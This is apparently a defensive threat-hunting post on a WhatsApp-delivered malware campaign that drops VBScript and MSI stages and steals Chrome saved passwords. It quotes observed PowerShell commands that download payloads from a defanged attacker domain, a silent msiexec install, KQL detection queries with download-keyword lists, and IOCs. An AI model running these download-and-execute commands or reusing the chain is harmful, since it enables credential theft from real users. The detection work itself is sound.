---
Title: WhatsApp malware campaign targeting Chrome credential vaults
Description: 
Author: Puneet Jena
Date: 2025-11-16T21:57:12.000Z
Robots: noindex,nofollow
Template: index
---
<p>While hunting for malicious PowerShell techniques, we identified anomalous behavior indicative of staged payload execution.</p>

<p><a href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fuw1f82mj12ju4f45wzac.png" class="article-body-image-wrapper"><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fuw1f82mj12ju4f45wzac.png" alt=" " width="800" height="50"></a></p>

<p>Initial Access &amp; Delivery Chain Summary</p>

<ul>
<li>Threat actors leveraged WhatsApp as the initial access channel, sending messages to multiple employees within the organization to build trust before sharing a malicious ZIP file. Since ZIP files cannot be opened on mobile devices, users were compelled to access the archive on their endpoints, where they were deceived into executing an embedded VBScript payload.</li>
<li>Execution of the VBScript initiated a multi-stage payload delivery mechanism, where it:</li>
<li>Downloaded a secondary VBScript and an MSI installer from a remote C2 server (varegjopeaks[.]com) and saved them to the temporary directory.</li>
<li>Executed the MSI file silently via msiexec.exe, which dropped an additional VBS script named “installer”.</li>
<li>Created persistence by adding the installer script to the Run registry key.</li>
<li>Downloaded a specific Python environment and executed a PowerShell script that profiled the installed Chrome version and downloaded the official Chrome test automation driver.</li>
<li><p>Accessed and exfiltrated credentials stored in the Chrome password vault, continuously harvesting newly saved passwords due to the established persistence.</p></li>
<li><p>Observed Malicious Execution Activity</p></li>
</ul>

<p><a href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fgi8xx0uae98mqwye9l0y.png" class="article-body-image-wrapper"><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fgi8xx0uae98mqwye9l0y.png" alt=" " width="800" height="231"></a></p>

<p><strong>WScript Executions</strong></p>

<ul>
<li>"wscript.exe" C:\Users*\AppData\Local\Temp\baixa_sscado.vbs</li>
<li>"WScript.exe" C:\Users*\AppData\Local\Temp*<em>.zip.0e6</em>.vbs</li>
<li>"wscript.exe" C:\Users*\AppData\Local\Temp\installer.vbs</li>
</ul>

<p><strong>PowerShell Download Activity</strong></p>

<ul>
<li>"powershell.exe" -ep bypass -c "Invoke-WebRequest -Uri 'hxxps://varegjopeaks[.]com/altor/baixa_sscado.vbs' -OutFile $env:TEMP\baixa_sscado.vbs -UseBasicParsing"</li>
<li>"powershell.exe" -ep bypass -c "Invoke-WebRequest -Uri 'hxxps://varegjopeaks[.]com/altor/teste_obscado.vbs' -OutFile $env:TEMP\installer.vbs -UseBasicParsing"</li>
<li>"powershell.exe" -ep bypass -c "Invoke-WebRequest -Uri 'hxxps://varegjopeaks[.]com/altor/installer.msi' -OutFile $env:TEMP\installer.msi -UseBasicParsing"</li>
</ul>

<p><strong>- Msiexec Execution</strong></p>

<ul>
<li>"msiexec.exe" /i C:\Users*\AppData\Local\Temp\installer.msi /quiet /norestart</li>
</ul>

<p><strong>Detection query :</strong></p>

<p>There will be false positives in the results, which must be eliminated through validation and filtering.</p>

<p>DeviceProcessEvents<br>
| where InitiatingProcessFileName contains "wscript"<br>
| where FileName contains "powershell.exe"<br>
| where ProcessCommandLine has_any ("-enc", "-encode", "http", "https", "Invoke-RestMethod", "New-Object Net.WebClient", "System.Net.HttpWebRequest", "DownloadFile", "curl", "wget","iex","iwr")<br>
| distinct ProcessCommandLine,InitiatingProcessCommandLine</p>

<p><strong>.vbs &amp; .msi Execution Identification :</strong></p>

<p>union isfuzzy=true DeviceProcessEvents<br>
| where FileName contains "powershell.exe"<br>
| where ProcessCommandLine has_any ("-enc", "-encode", "http", "https", "Invoke-RestMethod", "New-Object Net.WebClient", "System.Net.HttpWebRequest", "DownloadFile", "curl", "wget","iex","iwr")<br>
| project DeviceName,T1 = Timestamp , ProcessCommandLine , InitiatingProcessCommandLine<br>
| join kind=inner ( DeviceProcessEvents<br>
| where ProcessCommandLine contains "wscript" or ProcessCommandLine contains "msiexec"<br>
| where ProcessCommandLine contains ".msi" or ProcessCommandLine contains ".vbs"<br>
| project DeviceName,T2 = Timestamp , ProcessCommandLine1 = ProcessCommandLine , InitiatingProcessCommandLine1 = InitiatingProcessCommandLine<br>
) on DeviceName<br>
| extend timedifference = abs(datetime_diff('minute', T1, T2))<br>
| where timedifference &lt; 1</p>

<p><strong>Reference :</strong></p>

<ul>
<li><a href="https://www.joesandbox.com/analysis/1801119/0/html" rel="noopener noreferrer">https://www.joesandbox.com/analysis/1801119/0/html</a></li>
</ul>

<p><strong>IOC</strong></p>

<ul>
<li>36805f82166acf711007ab42e0e4147c10c7639fbf94eac9a1d26401e91a26ea</li>
<li>8041b6cdeb3a4502066d18d024e671577dda23d4a1e4d083f34fcbfa39469279</li>
<li>varegjopeaks[.]com/altor/teste_obscado[.]vbs</li>
<li>varegjopeaks[.]com/altor/baixa_sscado[.]vbs</li>
<li>varegjopeaks[.]com</li>
</ul>

